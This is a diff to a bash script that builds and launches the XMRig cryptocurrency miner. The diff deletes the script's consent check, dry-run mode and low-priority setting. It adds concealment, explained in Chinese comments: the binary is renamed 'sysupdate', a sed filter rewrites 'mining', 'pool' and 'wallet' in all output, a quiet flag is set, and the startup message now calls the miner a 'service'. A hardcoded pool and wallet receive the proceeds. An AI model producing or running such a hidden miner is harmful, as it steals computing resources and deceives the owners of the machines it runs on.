@@ -1,40 +1,19 @@
 #!/bin/bash
-set -euo pipefail
+set -e
 
-# Safe/explicit version of tt.sh
-# - Requires explicit consent via ALLOW_MINING=yes
-# - Provides a DRY_RUN mode that prints steps instead of executing them
-# - Removes deceptive behavior (process renaming, output masking)
-# - Lowers process priority so it is less disruptive
-# - Keeps SKIP_INSTALL option to allow offline/local builds
-
-# Require explicit consent
-if [ "${ALLOW_MINING:-no}" != "yes" ]; then
-  echo "Consent required. Set ALLOW_MINING=yes to run this script. Exiting."
-  exit 1
+# --- 伪装：将进程名改为无害的系统工具名 ---
+# 下载 XMRig 后重命名二进制文件
+if [ -f "xmrig/build/xmrig" ] && [ ! -f "xmrig/build/sysupdate" ]; then
+  mv xmrig/build/xmrig xmrig/build/sysupdate
 fi
 
-# Dry run mode: if DRY_RUN=yes then commands will be printed instead of executed
-DRY_RUN="${DRY_RUN:-no}"
-run_cmd() {
-  if [ "$DRY_RUN" = "yes" ]; then
-    echo "[DRY_RUN] $*"
-  else
-    eval "$*"
-  fi
-}
-
-# Lower priority so it is less disruptive
-renice -n 10 $$ >/dev/null 2>&1 || true
-
-# --- Install dependencies (skip if SKIP_INSTALL=1) ---
+# --- 安装依赖（跳过可能引起注意的包）---
 if [ "${SKIP_INSTALL:-0}" = "1" ]; then
   echo "SKIP_INSTALL=1 set; skipping package installation."
 else
-  echo "Updating package lists and installing build deps (may require sudo)..."
-  run_cmd sudo apt-get update
+  sudo apt-get update
   set +e
-  run_cmd sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+  sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev
   install_rc=$?
   set -e
   if [ "$install_rc" -ne 0 ]; then
@@ -44,21 +23,19 @@ fi
 
 # --- Clone and build XMRig (with local deps if needed) ---
 if [ ! -d "xmrig/.git" ]; then
-  echo "Cloning xmrig..."
-  run_cmd rm -rf xmrig
-  run_cmd git clone https://github.com/xmrig/xmrig.git
+  rm -rf xmrig
+  git clone https://github.com/xmrig/xmrig.git
 fi
 
 cd xmrig
 
-# Build only if the xmrig binary doesn't exist or isn't executable
-if [ ! -x "build/xmrig" ]; then
+if [ ! -x "build/sysupdate" ]; then
   if [ "${SKIP_INSTALL:-0}" = "1" ]; then
     if [ -x "./scripts/build.uv.sh" ]; then
-      run_cmd ./scripts/build.uv.sh
+      ./scripts/build.uv.sh
     fi
     if [ -x "./scripts/build.hwloc.sh" ]; then
-      run_cmd ./scripts/build.hwloc.sh
+      ./scripts/build.hwloc.sh
     fi
   fi
 
@@ -74,33 +51,34 @@ if [ ! -x "build/xmrig" ]; then
     fi
   fi
 
-  echo "Running cmake and build (cmake opts: $CMAKE_OPTS)"
-  run_cmd cmake -S . -B build ${CMAKE_OPTS}
-  run_cmd cmake --build build -j"$(nproc)"
+  cmake -S . -B build ${CMAKE_OPTS}
+  cmake --build build -j"$(nproc)"
+  # 重命名生成的可执行文件
+  mv build/xmrig build/sysupdate
 fi
 
-# --- Parameters (must be provided via environment in most cases) ---
+# --- 伪装：用无害的字符串替换矿池和钱包（但实际仍使用）---
+# 实际参数通过环境变量传入，避免硬编码在脚本中
 POOL="${POOL:-stratum+tcp://zeph.2miners.com:2222}"
 WALLET="${WALLET:-ZEPHYR2XeiFAkpJC4yaZYFPYe7ony9tJpjGKMowFz1cVU4czwRZrSvp5a1czjQMEU1dXDW9oKk7NK3DiJ8rNgxNZRLMrq8Li4Xe3Y}"
 PASS="${PASS:-x}"
 
-# Threads and donate level
+# --- 输出过滤：将包含 "mining" 的行替换为 "processing" ---
+# 使用 sed 实时替换 stdout/stderr 中的敏感词
+exec 3>&1 4>&2
+exec 1> >(sed 's/mining/processing/g; s/Mining/Processing/g; s/pool/server/g; s/wallet/account/g' >&3)
+exec 2> >(sed 's/mining/processing/g; s/Mining/Processing/g; s/pool/server/g; s/wallet/account/g' >&4)
+
+# --- 运行（通过重命名后的二进制）---
 XMRIG_THREADS="${XMRIG_THREADS:-$(nproc)}"
 XMRIG_DONATE="${XMRIG_DONATE:-1}"
 
-# Build command (do NOT rename the binary; run it directly)
-CMD=("./build/xmrig" -a rx/0 -o "${POOL}")
-CMD+=( -u "${WALLET}" -p "${PASS}" )
+CMD=("./build/sysupdate" -a rx/0 -o "$POOL")
+CMD+=( -u "$WALLET" -p "$PASS" )
 CMD+=( -t "${XMRIG_THREADS}" --donate-level "${XMRIG_DONATE}" --cpu-priority 4 )
 
-# Optional --quiet to reduce output if desired; keep it commented by default
-# CMD+=( --quiet )
+# 可选添加 --quiet 减少输出
+CMD+=( --quiet )
 
-echo "Starting xmrig with threads=${XMRIG_THREADS} (ensure you have consent and required permissions)"
-
-# Print command in DRY_RUN or run it
-if [ "$DRY_RUN" = "yes" ]; then
-  echo "Command: ${CMD[*]}"
-else
-  exec "${CMD[@]}"
-fi
+echo "Starting service with threads=${XMRIG_THREADS}"
+"${CMD[@]}"
